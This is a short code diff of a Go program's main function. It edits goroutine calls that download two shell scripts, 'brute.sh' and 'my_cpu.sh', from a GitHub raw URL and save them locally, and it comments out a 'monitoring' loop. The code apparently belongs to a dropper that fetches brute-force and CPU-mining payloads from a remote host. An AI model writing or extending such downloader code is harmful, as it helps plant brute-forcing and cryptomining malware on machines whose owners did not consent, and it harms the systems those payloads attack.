@@ -19,22 +19,22 @@ func main() {
 
 
 
-go  utils_down("https://github.com/atilabyte/golang/raw/refs/heads/master/brute.sh")
+go  utils_down("https://github.com/atilabyte/golang/raw/refs/heads/master/brute.sh" , "brute.sh")
 
 
-go  utils_down("https://github.com/atilabyte/golang/raw/refs/heads/master/my_cpu.sh")
+go  utils_down("https://github.com/atilabyte/golang/raw/refs/heads/master/my_cpu.sh" , "my_cpu.sh")
 
 
 
-for {
+//for {
 
-
- proc() //monitoring vkzmn
+ 
+// proc() //monitoring vkzmn
 
 
  
 
-}
+//}
 
 
 
